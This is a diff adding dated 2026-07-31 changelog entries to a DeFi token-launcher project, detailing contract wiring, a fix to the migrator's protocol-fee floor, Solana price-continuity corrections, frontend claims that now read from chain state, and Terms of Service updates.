@@ -1661,6 +1661,669 @@ only" to "rail armed, 0 launches", and `/solana-launch` no longer tells readers
 — both of those conditions are now met, yet submission is deliberately still absent, so
 that sentence had become an implied promise the page never intends to keep.
 
+### Changed — The protocol's 15% line runs through a deployed LockerClaimer, and the recipient label follows the numeraire (2026-07-31)
+
+`4fbedd34` ([#197](https://github.com/fomotsar-commits/tegridy-farms/pull/197)).
+**LockerClaimer is deployed and Etherscan-verified at
+`0xD2Ac3dC13c6fd09855F0e4a077826983Aa66E6C7`** (tx `0x44773647…43ca`, cost
+0.00001662 ETH), which closes the "Status: not deployed, not wired" recorded in the
+2026-07-30 LockerClaimer entry below and **supersedes
+[#160](https://github.com/fomotsar-commits/tegridy-farms/pull/160)'s workaround of
+pointing both numeraires at the Treasury Safe** because nothing existed that could
+originate a locker claim.
+
+Every destination was read back on-chain before wiring rather than assumed. The
+commit records: runtime 1,181 bytes, byte-identical to the local artifact;
+`locker()` = `0xe24fc2f7191e850e2d4514abb4d39305b1871ec6`; `revenueDistributor()` =
+`0xf993316e2fc079de4358c489a935e01e03e23e17`; `treasury()` =
+`0x7d2620243edad69ec81a53c4a063b07995a4bd7d`; and `owner()`, `transferOwnership`,
+`setLocker` and `upgradeTo` **all absent**. With no admin surface and three immutable
+destinations, checking the constructor args once really is the whole audit of where
+this money goes.
+
+`protocolFeeSink()` now returns that address for both numeraires — but **the LABEL
+stays numeraire-aware**, because a locker position carries two currencies that do not
+land in the same place. On an ETH pair the numeraire leg is forwarded to
+RevenueDistributor, where a staker can claim it, so "Tegridy stakers" is accurate for
+that pair again; on a TOWELI pair both legs are ERC20 and sweep to the Safe, so
+claiming staker yield there would be false. `DEFAULT_FEE_CONSTITUTION`'s static label
+returns to "Tegridy stakers" for the default pair, matching `protocolFeeSink()`.
+
+Terms §7 was rewritten to describe both destinations rather than one — hours after
+[#185](https://github.com/fomotsar-commits/tegridy-farms/pull/185) had rewritten the
+same section to attribute the protocol share to the Treasury, which was correct until
+this deploy landed — and **both** recipient labels are now interpolated from
+`protocolFeeSink()`: the existing guard against hardcoded fee figures was extended to
+cover the second label rather than relaxed to accommodate it. 54 files / 890 tests,
+`tsc` clean. Mutation-checked: reverting the sink to Treasury turns 5 red; making the
+label ignore the numeraire (so an exotic pair also claims stakers) turns 3 red.
+
+### Fixed — Our V4 migrator enforced none of Doppler's 5% protocol floor, and the petition asking Whetstone to bless it never mentioned that (2026-07-31)
+
+`3cee6308` ([#196](https://github.com/fomotsar-commits/tegridy-farms/pull/196)) and
+the petition half of `f85e4c0a`
+([#195](https://github.com/fomotsar-commits/tegridy-farms/pull/195)).
+
+A custom `LiquidityMigrator` **replaces** Doppler's own module, so anything theirs
+enforces and ours does not is simply not enforced. The commit records two agents
+independently confirming, with four live `eth_call` probes against the deployed
+`UniswapV4Migrator` `0x0820a4d0…05f5` sent `from` the Airlock, that their module
+requires the Airlock owner to hold at least 5% of the streamed fees:
+`InvalidProtocolOwnerBeneficiary()` (`0xdfa06864`) when the owner is absent, and
+`InvalidProtocolOwnerShares(5e16, 4e16)` (`0x2b6dc823`) at 4% — the contract itself
+reporting the minimum. **The selector `0x2b6dc823` is present in
+UniswapV4Migrator's runtime code and absent from Airlock's, so the enforcement lives
+in exactly the module we would be replacing.** `TegridyLiquidityMigrator` had no
+`owner()` read, no minimum, and accepted an empty beneficiary list outright;
+`TegridyFeeLocker` had no protocol-owner requirement either; the 5% existed only in
+frontend TypeScript, which `Airlock.create` does not go through. Petitioning
+Whetstone to whitelist that would have been asking them to approve a module that
+deletes their own revenue from every launch routed through it.
+
+- **The floor is now in our own source — which is still the only place it can be,
+  because the migrator is deployed nowhere.** `TEGRIDY_V4_MIGRATOR_ADDRESS` is the
+  zero address, which the petition states outright and the same day's README pass
+  re-verified, so this changes what a graduation *would* enforce, not what any live
+  rail does today. `initialize` reads `Airlock.owner()` live and requires
+  `>= PROTOCOL_OWNER_MIN_SHARES` (5e16 WAD —
+  [`contracts/src/v4/TegridyLiquidityMigrator.sol`](contracts/src/v4/TegridyLiquidityMigrator.sol)
+  line 159, enforced at lines 340–342). Error names and selectors are byte-identical
+  to Doppler's, so an integrator decoding a revert cannot tell the two modules apart
+  on this point. Two deliberate choices: the read is **live rather than pinned at
+  construction**, because Whetstone's owner is a rotatable Safe
+  (`0x21E2ce70511e4FE542a97708e89520471DAa7A66`, VERSION 1.4.1, `getThreshold()` 3
+  over 6 owners) and a pinned copy would turn a rotation into a revert on every
+  graduation; and duplicate owner entries **sum** rather than first-match, so a list
+  Doppler would accept is not rejected by us.
+- **The tests were shipped unrun, on purpose, and CI caught the one thing they got
+  wrong.** The commit states plainly that the v4 suite cannot execute on that
+  machine — v4-periphery's permit2 submodule is unreachable under Windows path
+  limits in every worktree and `core.longpaths` does not help, because the failure is
+  in submodule recursion — so 5 new tests (21 total, was 16) went up with `forge
+  build --skip test` clean and CI as the gate. CI returned 20 passed / 1 failed:
+  `test_migrate_routesPositionToLockerWhenSplitDeclared` asserted `b.length == 1`,
+  and Doppler's mandatory owner line makes every valid constitution at least two
+  entries. The assertion was **strengthened rather than bumped** — it now checks the
+  owner's line survives into the locker at its floor share, which is the property
+  that matters — and it finds the entry by search rather than index, because
+  `TegridyFeeLocker` requires strictly-ascending beneficiary addresses, so an entry's
+  position depends on how two `makeAddr` hashes sort.
+- **The petition's central safety claim was false.**
+  [`docs/WHETSTONE_MIGRATOR_PETITION.md`](docs/WHETSTONE_MIGRATOR_PETITION.md) said
+  "the LP position is minted to the Airlock-supplied recipient … it is the only
+  address we mint to"; the source mints to `TegridyFeeLocker` whenever a split is
+  declared (`positionOwner = hasConstitution ? address(feeLocker) : recipient`).
+  Corrected in place and **flagged as a correction, since the reader will diff it**.
+  §4 flipped from "nothing on-chain" to RESOLVED with the original finding kept in a
+  `<details>` block rather than deleted — the history is the evidence that we found it
+  ourselves. The document now also states what it had implied away: their
+  auction-phase `Airlock._handleFees` take is structurally unaffected (computed in
+  `Airlock.sol` before any balance reaches a migrator) so only the LP-fee leg is at
+  risk; our hook's POL skim (1% of swap output initially, 10% immutable ceiling) has
+  no analogue in a stock hookless graduation and they should price it in; nothing is
+  deployed; nothing is audited; and the contracts are still owned by a hot deployer
+  EOA because the three-Safe rebuild in
+  [`docs/SAFE_REHOME_RUNBOOK.md`](docs/SAFE_REHOME_RUNBOOK.md) has not been executed.
+  A new §10 of copy-pasteable `cast` commands lets Whetstone reproduce every number
+  instead of trusting us, and a §9 lists "what we still owe you before you should say
+  yes".
+- **A fail-silent regression is disclosed as a reason for them to say no.** The
+  hardcoded Airlock-owner value in `doppler.constants.ts` is byte-identical to the
+  live `Airlock.owner()`, so today a mismatch would revert `create()` — but once our
+  migrator is in the path it stops reverting at all and would quietly direct
+  Doppler's share at a stale address.
+- One further self-correction landed on top: the petition had claimed the migrator
+  test file has "zero mentions of doppler, protocolOwner, or airlockOwner". It greps
+  as protocolOwner 0, airlockOwner 0, **doppler 2** (lines 28 and 320, both comments,
+  neither an assertion). The substantive point stands — no test exercised the 5%
+  floor — but §10 invites reproduction, and that is the one paragraph where
+  credibility is the whole product.
+
+### Fixed — A Solana launch would have listed at a fraction of its own final curve price, and the target meant to prevent that was solved from the wrong curve (2026-07-31)
+
+The `tegridy-launch` half of `f85e4c0a`
+([#195](https://github.com/fomotsar-commits/tegridy-farms/pull/195)), cherry-picked
+from the own-venue worktree. This closes the **open operator decision** recorded in
+the 2026-07-30 "Solana graduation targets our own pool PDA" entry below — and
+retracts the number that entry carries. **Nothing live changed: `ba4d3399`, the same
+day, records that both Solana program ids return no account on mainnet, devnet or
+testnet**, so every fix below constrains launches that cannot yet be created.
+
+- **The gap, and the operator decision: enforce the band.** The curve prices on
+  virtual + real reserves; the pool is seeded with real reserves only. Those two
+  prices coincide at exactly one graduation target, and away from it the token gaps
+  the instant it lists. The commit records that at the parameters this repo actually
+  shipped — 30 virtual SOL against a 2 SOL target — **the pool would open at 14% of
+  the curve's final price, a ~7x drop**: nothing stolen, no instruction at fault, and
+  indistinguishable from a rug to everyone holding it. (The 07-30 entry states the
+  same defect as 6.7% and ~15x for the rehearsal configuration; the two commit bodies
+  measure different parameter sets and are not reconciled here.)
+  `initialize_global` and `update_global` now reject configurations outside ±5%
+  (`PRICE_CONTINUITY_BAND_BPS`). A ±5% band on PRICE is only about ±0.7% on the
+  TARGET, so `curve.rs` also gains an advisory `continuity_target` that solves for T —
+  nobody lands it by picking a round number.
+- **CORRECTION OF AN EARLIER FINDING, and of this file.** The 07-30 entry records
+  "the price-continuity invariant solves to T ≈ 85.0164 SOL". **That is wrong, and
+  the commit says so in its own words.** It was derived from pump.fun's invariant,
+  `S(Vs+T)^2 = Vt*T*(2Vs+T)` — the wrong curve, because pump.fun's virtual tokens
+  deplete *from* `Vt` while this program's `effective_tokens` is virtual+real and so
+  depletes *toward* it. The real condition is
+  `(Vs + T + R)^2 * Vt = Vs * (Vt + S) * (Vs + R)`, and **the matching target for our
+  reserves is 11.5446 SOL, not 85**. The mistake surfaced only because the wrong
+  formula demanded 85 SOL while `max_reachable_real_sol` capped the same
+  configuration at 27.96 SOL — two checks that could never both pass. The commit
+  states the root error as matching pump.fun's parameter *values* and assuming its
+  formula came with them. `MIGRATE_DESIGN.md` decision 10 is rewritten with the
+  corrected model and carries the correction explicitly; decision 3, which had
+  accepted "a one-off price step", now points at 10 rather than sitting in silent
+  contradiction.
+- **Enforcing costs no configuration freedom**, which is why it was the right call:
+  the continuity target is proportional to virtual SOL, so any target stays reachable
+  by scaling the opening book. That is also why `initial_virtual_sol` becomes settable
+  in `update_global` — without it the target could never be changed once set, because
+  every other value would gap. Curves snapshot their virtual reserves at
+  `create_launch` (`lib.rs:361`), so retuning moves future launches only and can never
+  reprice a live one. Both suites moved to exact continuity parameters, so the
+  rehearsal is finally economically representative: rehearsal `Vs = 5.329495216`,
+  `T = 2`, `R = 0.25` → 9999 bps; constraints `Vs = 30`, `T = 11.544610844`,
+  `R = 0.5` → 9999 bps.
+- **A missing lower bound on `migration_reserve_lamports`, found by re-reading the
+  security review's REFUTED pile rather than its findings** — the refuters conceded
+  both mechanisms were factually correct and then argued the impact away. The reserve
+  is snapshotted onto every curve at creation, so a too-small value does not fail at
+  config time: **it fails at the finish line of every launch created afterwards, with
+  cp-swap's pool already half-built and no way back.** Now floored at 42,156,720
+  lamports — the exact rent cp-swap charges its creator, computed from that program's
+  own `LEN` constants rather than estimated. Deliberately a floor and not the full
+  requirement, because cp-swap also charges `create_pool_fee` (0.15 SOL on mainnet)
+  from a *mutable* `AmmConfig` field, and baking the total in would risk rejecting a
+  valid config if that fee ever changed; the runbook carries the real number instead.
+- **Every migrated curve reported holding lamports it did not have.**
+  `migrate_to_amm` moved `deposit + reserve` off the curve but subtracted only
+  `deposit` from `real_sol_reserves`. Harmless on-chain — nothing reads it once
+  `complete` is set — but every indexer, explorer and Fact Sheet reading curve state
+  would have shown a false number.
+- **One helper, so the two entry points cannot drift.** The continuity check and the
+  reserve floor live in `check_launch_economics` (renamed from
+  `check_price_continuity`), called by both `initialize_global` and `update_global`.
+  That is the direct fix for a failure mode the commit names: the last time these were
+  written separately, `update_global`'s comment claimed to run "the same reachability
+  check as `initialize_global`" while silently omitting the migration reserve.
+  Ordering is load-bearing and tested — the reserve floor is checked *before* the
+  continuity band, so a too-small reserve reports `MigrationReserveTooLow` rather than
+  the confusing `GraduationPriceGap` it would otherwise trigger by moving the target.
+- Also fixed, found by one of the new tests: `isqrt_u128` seeded with `(n+1)/2`
+  overflows at `u128::MAX`, which in release wraps to zero and then divides by zero.
+  Unreachable at our magnitudes; fixed anyway.
+- **Docs shipped with it.** The runbook gained a `tegridy-launch` section for "the
+  three numbers you cannot guess" — the reserve minimum (192,156,720 lamports,
+  ~0.1922 SOL, derived from cp-swap's `LEN` constants, i.e. the enforced floor plus
+  the 0.15 SOL pool-creation fee), the graduation target as a *computed* value with a
+  copy-pasteable snippet the author ran (it returns 11544610844, exactly the constant
+  the constraints suite uses), and the 400k compute limit clients must set because
+  `migrate_to_amm` needs ~264k against a 200k default and omitting it fails with
+  "Program failed to complete", a message that reads like a program bug. The audit RFQ
+  gained a **Scope B**, because as written it described only the cp-swap fork's
+  four-constant diff — commissioning it would have bought a review of the safe program
+  and left the dangerous one unexamined. And the Solana README's claim that a clean
+  `cargo check` "catches essentially every class of error short of codegen" was
+  corrected: `cargo check` is not an SBF target, so it cannot see 4KB stack frames —
+  one added `seeds` constraint took `MigrateToAmm::try_accounts` to 4,224 bytes, the
+  linker warned, the build succeeded, and the program died at runtime while cargo
+  check stayed clean. **`cargo check` proves it compiles; only CI proves it runs.**
+
+### Fixed — Four live-site claims the chain did not back, and two explainers that reached nobody (2026-07-31)
+
+The frontend half of `f85e4c0a`
+([#195](https://github.com/fomotsar-commits/tegridy-farms/pull/195)), with the
+LP-farming half of `ba4d3399`
+([#194](https://github.com/fomotsar-commits/tegridy-farms/pull/194)) as its first,
+superseded pass. Each item was re-verified at `file:line` and against mainnet before
+being touched; one reported item turned out not to be a bug and is described as what
+it actually is.
+
+- **LP farming: "today" was six weeks stale.** `/launch` told a first-time launcher
+  their token plugs into "boosted LP farming today", and the page header sold the same
+  day-2 economy. Read on mainnet from `TegridyLPFarming`
+  `0x1171268AE5B69791c47Fd589b7825932c957e149`: `periodFinish()` = 1781493095, i.e.
+  2026-06-15 UTC, **46 days past**. `rewardRate()` still read non-zero — the Synthetix
+  residual that survives the period, and exactly why a rate-only check reports
+  emissions nobody is paid. Both copy sites now render from `periodFinish` through
+  [`frontend/src/lib/lpEmissions.ts`](frontend/src/lib/lpEmissions.ts), so the sentence
+  follows the contract instead of the calendar, and **a failed read degrades to "we
+  could not read whether a period is funded", never to "running"**. This supersedes
+  `ba4d3399`, which had corrected the first of the two sites with a static sentence
+  and never reached the header.
+- **Premium: real ETH yield sold on a rail that has not paid.** `PremiumPage` listed
+  "Real ETH yield" as a flat literal — Gold Card holders earning ETH out of the
+  protocol's swap-fee line — on a page charging a real monthly TOWELI fee. Read on
+  mainnet from `RevenueDistributor`
+  `0xF993316E2fC079de4358c489A935E01e03E23E17`: `totalDistributed()` = 0,
+  `totalClaimed()` = 0, `totalETHReceived()` = 0 — **not one distribution has
+  landed**. The claim is now conditioned on that read
+  ([`frontend/src/lib/premiumBenefits.ts`](frontend/src/lib/premiumBenefits.ts)), the
+  same self-gating rule `<RealYieldProof/>` already followed, and says plainly that
+  the Gold Card buys no yield today until a distribution lands.
+- **A countdown that never stopped counting down.** `FarmPage` clamped with
+  `Math.max(0, …)`, so every day after Season 3's end date (2026-09-05) would render a
+  confident "0d left" forever, and `LeaderboardPage` had no date check at all and
+  would keep inviting people into a closed season.
+  [`frontend/src/lib/season.ts`](frontend/src/lib/season.ts) reports the phase
+  instead: ended reads "Ended", un-started reads "starts in Nd", an unparseable window
+  reads unknown. Same defect class as the "+10% NFT boost" banner that shipped past
+  its own window.
+- **Launch Radar: the bound the comment promised but the code lacked.** The price
+  clamp added after a scam pool rendered as "520607 ETH" is present and tested —
+  **that item was not a regression** — but its comment claimed to guard "the same
+  fiction arriving via the reserve alone (finite, positive, absurd)" while the code
+  only rejected non-finite and negative values. Since only the reserve is rendered, a
+  fabricated reserve paired with an unremarkable per-token price still printed. The
+  magnitude bound the comment already described was added.
+- **Two explainers were stranded in dead branches — restored, not deleted.**
+  `LauncherExplainer` and `SolanaLauncherExplainer` sat inside
+  `if (!isLauncherEnabled())` / `if (!isSolanaLauncherEnabled())` arms that went dead
+  when both flags flipped true. **That is the copy a first-time launcher reads** —
+  what the audited template guarantees, what a Fact Sheet is and is not, how the fee
+  split works — and it was reaching nobody. Both now render in the live path beneath
+  the wizard so the form still leads; the gated arms keep them, so re-gating loses
+  nothing. Their tense was corrected in the same pass: a card headed "what we are
+  waiting on", a footer reading "nothing here is live", and two cross-links calling
+  live rails "gated" were all false once the flags flipped.
+- **A clarity change that is explicitly not a correction.** `ba4d3399` set out to fix
+  what looked like a live reward rate on a dead schedule and found it was not:
+  `useLPFarming` already zeroes `rewardRatePerDay` once `periodFinish` lapses (fix
+  F100), so the tile read an honest "0.00 / day". The gap was legibility — "0.00 /
+  day" beside a past "Period Ends" date reads like a lull between epochs. The tiles now
+  say "Reward Rate (ended)" / "Period Ended" in amber, **labelled in code as a
+  legibility change so the next reader does not conclude F100 was broken.**
+
+Verified: 157 files / 2031 tests green; `tsc --noEmit` clean on `tsconfig.app.json`
+(603 src files listed, so it is actually checking). 30 tests across the four
+new/extended pure modules, **each mutation-checked red against the pre-fix
+behaviour**: the season clamp ('active' vs 'ended'), the unconditional yield claim,
+the always-running emissions assumption plus the literal shipped "boosted LP farming
+today" string, and the missing reserve bound — which reads back exactly 520607
+without it.
+
+One number inside this batch was itself wrong and was fixed in the same PR: the
+on-chain `rewardRate` was a bad hex→dec conversion (`0xbbf969acc0362` is
+3,306,878,306,878,306, not the 3,365,022,998,270,306 first written). Comment-only in
+`lpEmissions.ts` and its test — nothing reads `rewardRate`, by design — but it was a
+documented on-chain figure inside the very commit that exists to stop us publishing
+unbacked numbers.
+
+### Added — Token issuance brought inside the Terms, and a permanent record page for every launched token (2026-07-31)
+
+`6a1c9c22` ([#185](https://github.com/fomotsar-commits/tegridy-farms/pull/185)).
+
+- **The live launcher was outside the Terms.** `/launch` had been open to the public
+  to deploy ERC-20s on Ethereum mainnet since 2026-07-22 — no token has actually come
+  through it, as [#188](https://github.com/fomotsar-commits/tegridy-farms/pull/188)
+  established later the same day — while the Terms of Service described only farming,
+  swap, staking, NFT lending and the NFT AMM: **§2 never mentioned token creation and
+  §7 never mentioned launch fees, so the live product did something the Terms did not
+  describe, and nothing in CI noticed.** §2 now lists the launcher — an ERC-20 created
+  through the third-party Doppler protocol against ETH or TOWELI
+  (`EXOTIC_LAUNCHES_ENABLED`), plus the Solana rail described accurately as a config
+  *preview* with no signer, since real Solana launches go through the operator's CLI
+  wrapper. §7 gains the launch-fee reality, **rendered from `LAUNCH_FEE_TIER`,
+  `DEFAULT_FEE_CONSTITUTION` and `protocolFeeSink()`** the same way `SWAP_FEE_PCT` is
+  rendered from `SWAP_FEE_BPS`, so the copy cannot drift from what the wizard submits.
+  New §8–§11 cover the issuer's side: the launcher is the issuer and carries the
+  securities/tax/consumer-protection burden; the Protocol is a non-custodial tool and
+  not an underwriter, exchange, broker or promoter; launches are permissionless and
+  irreversible; the Fact Sheet and gate tier are point-in-time structural
+  **disclosures** — exactly the checks `gate.ts` runs, no safety claim; prohibited
+  uses; and de-listing from our own UI as an editorial act that cannot touch the token
+  on-chain. Existing sections are untouched, only renumbered 12–15. `RisksPage` gains a
+  matching launcher entry, and `StepReview` — one button from the irreversible
+  `create()` — now links to `/terms`, which nothing in the launch flow did before: **a
+  term nobody is shown is a weak term.**
+  [`frontend/src/pages/termsLauncherCoverage.test.ts`](frontend/src/pages/termsLauncherCoverage.test.ts)
+  couples the flags to the disclosure — flip `LAUNCHER_ENABLED` / `EXOTIC` /
+  `SOLANA_LAUNCHER_ENABLED`, retype a fee figure, or drop the `/terms` link and it goes
+  red. The commit states outright that this is **not legal advice and has not been
+  reviewed by a lawyer**; it is an operational disclosure of what the code does. That
+  first §7 rewrite was itself wrong about the money and was rewritten again inside this
+  same PR — see the fee-copy entry below.
+- **A launched token had nowhere to be linked to.** The cohort Explorer rows were dead
+  ends, so the moment a real launch lands there was no page to send a buyer, a
+  journalist or a sceptic to. [`frontend/src/pages/LaunchTokenPage.tsx`](frontend/src/pages/LaunchTokenPage.tsx)
+  at `/launch/:token` is that page, and its whole design is about keeping apart three
+  things that render the same if you are careless: *we read it, the answer is yes*;
+  *we read it, the answer is no*; and **we could not read it**. Every classifier in
+  [`frontend/src/lib/launcher/tokenDossier.ts`](frontend/src/lib/launcher/tokenDossier.ts)
+  returns an explicit unreadable/cannot-verify kind and the page renders it as "?"
+  rather than a tick or a cross. That distinction is load-bearing in four places:
+  provenance is a **single `getAssetData` `eth_call`**, not the multi-million-block
+  `Create`-log scan the public RPCs reject, and absence is keyed off
+  `poolInitializer == 0` rather than the integrator, because a real Doppler launch made
+  without an integrator legitimately has `integrator == 0` and must not be reported as
+  "not a Doppler launch"; the locker read returns `unsupported: true` today and renders
+  as "Graduation state unverified", never "Not graduated"; `gate.ts` substitutes
+  conservative defaults when a read fails, which is right for gating and wrong for
+  publishing, so `unverifiedGateChecks()` suppresses them; and the EAS attestation is a
+  genuine read-back whose feasibility was **measured, not assumed** — mainnet has no
+  EAS Indexer contract and all three public RPCs refuse the full-history range, so it
+  resolves to `unverifiable`, rendered as "Cannot verify" with a reason and a link to
+  the EAS explorer, and never as a fabricated "not attested". The route is lazy-loaded
+  and **never gated**, because a launched token's disclosures must stay reachable even
+  if the create wizard is re-gated. 23 mutations applied and reverted; all 23 turn the
+  suite red. Not done, and said so: per-token OG/unfurl tags, which would need SSR or a
+  serverless function this project cannot spend at 9/12.
+- **Then the same PR shipped that page publishing green ticks off reads that never
+  landed.** `unverifiedGateChecks()` suppressed fabricated values only on the
+  `!knownSafeTemplate` branch — **but every launch through our own rail IS that
+  template**, and `collector.safeRead` degrades an individual failed view call to a
+  conservative fallback the gate scores as a PASS. One 429 inside the `Promise.all`
+  (the public RPCs return 429/1015 routinely) and the page stated, in green,
+  "Ownership renounced." off an `owner()` that never read — inverted for a token that
+  has one, and the flagship-tier discriminator — and "No team/insider allocation." off
+  a `totalSupply` nobody read. `safeRead` now records which reads did not land,
+  `RawTokenFacts` carries it as an optional `unreadFields` the gate ignores (a fallback
+  failing the gate is the safe direction, so no producer or consumer changed), and the
+  page suppresses off what actually landed rather than off which template it is. 48
+  files / 781 tests, `tsc` clean. Mutation-checked: reverting the unread-driven
+  suppression turns 2 red; making the collector stop recording failures turns 3 red —
+  **and that second mutation initially broke nothing at all, because the recording was
+  uncovered, which is why the collector tests exist.**
+- **Reading the live page caught three things the unit tests did not**: the attestation
+  lookup blocked the entire render for ~15s (it now loads independently and shows
+  "Checking…"), the insider-float and ownership checks were still rendering fabricated
+  green ticks, and viem's transport error dumped its whole JSON-RPC body onto the page.
+
+### Fixed — The fee split on the screen where creators sign described a different pool's fee (2026-07-31)
+
+`5624c08b` via `232489f2`
+([#189](https://github.com/fomotsar-commits/tegridy-farms/pull/189)), with the same
+defect corrected in Terms §7
+([#185](https://github.com/fomotsar-commits/tegridy-farms/pull/185)) and on
+`ChangelogPage` ([#188](https://github.com/fomotsar-commits/tegridy-farms/pull/188)).
+
+**A launch has two fee phases, and the signing screen conflated them.**
+`LAUNCH_FEE_TIER = 10_000` (1%) is passed to `withMarketCapRange` — it is the
+**auction** pool's fee. The constitution is attached to
+`withMigration(...).streamableFees.beneficiaries`, so it divides the **graduated**
+pool, whose fee is `MIGRATION_POOL.fee = 3000` (0.30%). `/launch` told a creator "A 1%
+total trade fee" directly above the constitution table, on the screen where they sign.
+
+Two consequences, and the second is the bad one: the stated share is overstated ~3.3x
+for a token that graduates; and **during the auction the creator's share of that 1% is
+zero**, because the protocol takes a third-party integrator fee there — paid to
+`LAUNCHER_INTEGRATOR_ADDRESS`, which `config.ts` documents as a re-pointable
+single-key EOA — none of which is enforced on-chain or promised to them. Most launcher
+tokens never graduate, **so for the modal launch the number on the screen was not 3.3x
+off; it described a payment that never happens.** That also flatly contradicted the
+next sentence, which claimed the constitution "can afterwards be changed by no one".
+
+- **The two commits disagree about Terms §7, and the disagreement is kept.**
+  `5624c08b` says "TermsPage §7 has always said this correctly", so the app
+  contradicted itself and the accurate version was on the page nobody reads — while
+  the pre-signature panel links Terms §8–§11 and not §7. But `6a1c9c22`, merged
+  earlier the same morning, calls the pre-existing §7 "FACTUALLY WRONG about the
+  money" for the identical conflation and rewrites it. Both statements are recorded as
+  their commits wrote them; this file does not pick between them. The rewrite
+  describes both phases separately, renders the graduated fee from `MIGRATION_POOL`
+  the way it renders `SWAP_FEE_PCT`, promises nothing about the auction split, and
+  scopes the immutability claim to the post-graduation constitution — while noting
+  each beneficiary may re-point its own entry via the locker's `updateBeneficiary`
+  (selector `0x3e8eb5a4`).
+- **Both percentages on the signing screen are now rendered from the constants rather
+  than typed**, so the literal cannot drift back, and the copy says plainly that the
+  auction fee is not theirs.
+- New [`frontend/src/pages/launchFeeCopy.test.ts`](frontend/src/pages/launchFeeCopy.test.ts)
+  is the missing half of the existing guard: `termsLauncherCoverage.test.ts` already
+  forbids this class of claim **but scans only `TermsPage.tsx`, which is exactly why it
+  never fired here.** It asserts the absence of the wrong phrasing, the *presence* of
+  the derivation — so re-typing a literal cannot quietly make the guard vacuous — and
+  the substantive disclosure. Mutation-checked: restoring the old literal fails it. It
+  also caught a false positive on itself first, because the file quotes the old string
+  in a comment explaining the fix, so comments are stripped before the copy assertions.
+- The `ChangelogPage` copy repeated the same conflation — the 70/10/15/5 split applied
+  to "the 1% trade fee" — and was corrected in #188 to defer to §7.
+- The defect was found by an 11-agent launcher-readiness review that simulated
+  `Airlock.create` against live mainnet and decoded the migrator calldata. **The shares
+  written on chain were correct** — the commit records that decode as 80.0000 /
+  15.0000 / 5.0000, summing to 1e18, while `DEFAULT_FEE_CONSTITUTION` in `config.ts`
+  is a four-line 70 / 10 / 15 / 5; the two figures are quoted as their commits recorded
+  them and are not reconciled here. Only the copy was wrong. 2,010 tests green,
+  `tsc -b` clean, eslint clean on both files.
+
+### Fixed — The cohort feed rendered empty because no RPC the browser can reach would serve its log query (2026-07-31)
+
+`beb4bb9a` ([#187](https://github.com/fomotsar-commits/tegridy-farms/pull/187)).
+**The cohort surfaces had rendered empty since they were built, and not because the
+feed had established anything — it could never ask.** (The empty render happened to be
+correct: [#188](https://github.com/fomotsar-commits/tegridy-farms/pull/188), later the
+same day, records that the Airlock emitted no logs across the launcher's live window.
+Right by accident is the defect, not the defence.)
+
+`readOurLaunches` is two phases: enumerate every Airlock `Create`, then read
+`getAssetData(asset)` per asset for the integrator, which the event does not carry.
+Phase two is a multicall the browser does fine. Phase **one** is an `eth_getLogs`
+across the Airlock's whole life, and the commit records every reachable RPC refusing
+it on the day: publicnode → "Archive requests require a personal token"; drpc →
+"ranges over 10000 blocks are not supported on free plan"; and `api/alchemy.js` → the
+Airlock is not in `ALLOWED_CONTRACTS`, and even added it would hit
+`MAX_BLOCK_RANGE = 10_000` — **audit R049 H-5, a cap worth keeping rather than
+widening.**
+
+- Phase one now comes from `?resource=launch-cohort`
+  ([`frontend/api/_lib/launch-cohort.js`](frontend/api/_lib/launch-cohort.js)),
+  Etherscan with the key server-side. **No new serverless function** — dispatched from
+  the aggregator catchall behind a lazy import like its two siblings, so the function
+  count stays 9/12 and the swap hot path pays nothing.
+- The resource returns asset addresses **only**. Deciding which are ours stays in
+  `ourLaunches.ts`, so provenance keeps exactly one implementation and the
+  all-or-nothing rule it already has.
+  [`frontend/src/lib/launcher/cohortLogSource.ts`](frontend/src/lib/launcher/cohortLogSource.ts)
+  wraps the viem client so that only `getLogs` is redirected — **via a `Proxy`, not an
+  object spread, because a spread drops the prototype-borne `multicall` that phase two
+  depends on.**
+- **Failure is never an empty cohort.** An unreadable history throws
+  `CohortUnavailableError` and `LaunchPage` shows "we couldn't read the launch history
+  — this does not mean no tokens have launched", visibly distinct from a real empty
+  cohort. Collapsing those two is how an outage becomes a fabricated track record,
+  which is the defect these surfaces exist to prevent. A non-empty upstream list that
+  decodes to nothing is treated as corruption, not emptiness.
+- **The `Create` topic0 was hand-typed and wrong on the first pass.** It is now derived
+  from the Doppler SDK's own `airlockAbi` (`Create(address asset, address indexed
+  numeraire, address initializer, address poolOrHook)` → `0x68ff1cfc…`, 2 topics, 3
+  data words, `asset` at data word 0) and a test recomputes it from that ABI — a wrong
+  topic matches no logs and would have rendered a confident, permanent "nothing has
+  launched".
+- **Then the same PR shipped the exact bug it exists to prevent, and says so.** The
+  banner was wired to a `try/catch` around `readOurLaunches` — but that function never
+  throws, because a concurrent change (the `complete` flag described in the 2026-07-30
+  entry below) made every failure degrade to an empty result instead. **The catch was
+  dead code: an unreadable history would have set no banner and rendered as "nothing
+  has launched yet".** Every unit test passed the entire time, because they exercised
+  `cohortLogSource` in isolation and never fed the wrapped client to the real
+  `readOurLaunches` — unit-green, integration-broken. The banner now reads `complete`
+  and fires on `!complete`, which also covers the failure modes that were never the
+  catch's to see: a partial provenance read, an aborted scan. The integration test that
+  would have caught it was added — wrapped client plus the *real* `readOurLaunches`,
+  asserting a failing log source yields `complete: false` while a genuinely empty
+  history yields `complete: true`.
+
+Mutation-checked at both stages: failure returning `[]` instead of throwing → 2 red;
+object-spread instead of `Proxy` → 1 red; a one-character `topic0` change → 1 red; and
+making the log source return `[]` on failure → 3 red, including the integration case.
+903 tests green, `tsc` clean.
+
+### Internal — Canonical domain and CSP pin, the last unpinned hand-rolled ABI, a documentation backfill, and 14 claims retracted from this session's own PRs (2026-07-31)
+
+The mechanical half of the day: four PRs of plumbing, guards and corrections, none of
+which changes contract behaviour.
+
+**`memetic.fun` declared as the canonical origin** — `0aab5ee1` + `2c67c330` via
+`beb30fa1` ([#184](https://github.com/fomotsar-commits/tegridy-farms/pull/184)). The
+app disagreed with itself about which domain is production:
+[#180](https://github.com/fomotsar-commits/tegridy-farms/pull/180) corrected the API
+origin allowlists after finding the live site 403'ing its own endpoints (recorded in
+the 2026-07-30 entry below), but the **site-identity half was never corrected**, so
+every canonical tag, OG/Twitter card and the JSON-LD `url` still told search engines
+and every social unfurl that the app lives at the `.vercel.app` alias. Both hosts
+serve, so nothing was broken — this is about *declared identity*, not access, and
+`frontend/api/*` deliberately keeps both origins in its allowlist and is untouched.
+Changed: `index.html` (canonical, `og:url`, `og:image` + `secure_url`,
